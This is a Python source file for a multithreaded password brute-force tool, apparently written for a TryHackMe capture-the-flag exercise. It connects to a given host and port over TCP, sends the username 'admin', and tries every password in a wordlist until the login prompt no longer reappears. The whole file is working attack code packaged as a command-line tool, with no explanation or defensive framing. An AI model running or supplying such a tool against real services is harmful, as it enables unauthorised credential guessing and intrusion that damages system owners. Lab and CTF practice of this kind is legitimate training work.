import socket
import argparse
from threading import Event
from concurrent.futures import ThreadPoolExecutor, as_completed

class pass_brute:
    def __init__(self, args, stop_event):
        self.target = args.target
        self.port = args.port
        self.wordlist = args.wordlist
        self.threads = int(args.threads)
        self.stop_event = stop_event  # Store stop_event in class

    def connect(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target, self.port))
            return sock
        except TimeoutError:
            print("Connection Error: Couldn't connect to the target")
            exit(0)
            
        except socket.gaierror as sgE:
            print(f"Error: {sgE}")
            exit(0)
        
        except Exception as e:
            print(f"Error: {e}")
            exit(0)

    def passbrute(self, password):
        if self.stop_event.is_set():  # Stop brute-force if event is set
            return
        
        socket = self.connect()
        socket.send(f"admin\n".encode())
        connection_result = socket.recv(1024)

        if "Password:" in connection_result.decode():
            socket.send(f"{password}\n".encode())
            response = socket.recv(1024)

            if "Password:" not in response.decode():
                print(f"\n[+] Password Found: {password}")
                self.stop_event.set()  # Signal all threads to stop
                return password  # Return result

            else:
                socket.close()

    def passbrute_handler(self):
        socket = self.connect()
        socket.close()
        tasks = []

        try:
            with ThreadPoolExecutor(max_workers=self.threads) as Threads:
                try:
                    with open(self.wordlist, "r") as wordlist:
                        for password in wordlist:
                            if self.stop_event.is_set():  # Stop submitting if password is found
                                break
                            tasks.append(Threads.submit(self.passbrute, password.strip()))
                except FileNotFoundError:
                    print(f"Wordlist not found: {self.wordlist}")
                    exit(0)
                    
                for task in as_completed(tasks):  # Wait for all tasks
                    if task.result() is not None:
                        break

        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            self.stop_event.set()
            exit(0)

    def start(self):
        self.passbrute_handler()

class cli:
    def banner(self,args):
        print("""
                                        ___.                 __          
            ___________    ______ ______ \\_ |_________ __ ___/  |_  ____  
            \\____ \\__  \\  /  ___//  ___/  | __ \\_  __ \\  |  \\   __\\/ __ \\ 
            |  |_> > __ \\_\\___ \\ \\___ \\   | \\_\\ \\  | \\/  |  /|  | \\  ___/ 
            |   __(____  /____  >____  >  |___  /__|  |____/ |__|  \\___  >
            |__|       \\/     \\/     \\/       \\/                       \\/ 
                """)
        print("						Author   : PkTheHacker10")
        print("-" * 75)
        print("Github   : https://github.com/PkTheHacker10/THM-CTFs.git ")
        print("Target   :",args.target)
        print("Port     :",args.port)
        print("Threads  :",args.threads)
        print("Wordlist :",args.wordlist)    
        print("-" * 75)

    def argsparser(self):
        argsparser = argparse.ArgumentParser(add_help=False, usage=argparse.SUPPRESS, exit_on_error=False)
        argsparser.add_argument("-t", "--target", required=True)
        argsparser.add_argument("-p", "--port",type=int, required=True)
        argsparser.add_argument("-w", "--wordlist", required=True)
        argsparser.add_argument("-T", "--threads", default=40)
        args = argsparser.parse_args()
        return args

if __name__ == "__main__":
    stop_event = Event()
    cli = cli()
    args = cli.argsparser()
    cli.banner(args)
    print("Starting Password BruteForce Attack...")
    
    password_bruteforce = pass_brute(args, stop_event)
    password_bruteforce.start()
